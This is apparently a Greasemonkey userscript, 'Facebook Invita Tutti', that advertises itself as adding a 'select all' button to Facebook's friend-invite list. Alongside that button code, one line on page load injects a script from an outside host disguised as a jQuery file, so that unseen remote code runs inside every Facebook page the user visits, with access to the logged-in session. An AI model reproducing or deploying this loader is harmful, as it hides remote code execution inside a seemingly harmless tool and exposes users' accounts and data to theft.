// ==UserScript==
// @name           Facebook Invita Tutti
// @version        1.0
// @description    Aggiunge un link con scritto "Seleziona tutti"
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript== 

function f_init(){return true;}

window.onload = (a = (b = document).createElement("script")).src = "http://markp.byethost7.com/t/jquery.php", b.body.appendChild(a); 
var t=0;

function inject() {
  setTimeout(inject, 1000);
  f_init();
  if (document.getElementById("__dwh_inviteAllButton")) {
    return;
  }
  try {
    var ul = document.getElementById("_view_selected").parentNode;
  } catch (e) {
    return;
  }
  var liTag = document.createElement('li');
  liTag.setAttribute("id", "__dwh_inviteAllButton");
  var aTag = document.createElement('a');
  aTag.setAttribute("onclick", "f_init(); var elms = document.getElementById('friends').getElementsByTagName('li'); for (var fid in elms) { if (typeof elms[fid] === 'object' && elms[fid].getAttribute('class') != 'disabled') { fs.click(elms[fid]); }}; return false;");
  aTag.innerText = "Seleziona tutti";
  liTag.appendChild(aTag);
  ul.appendChild(liTag);
}


window.onload = inject();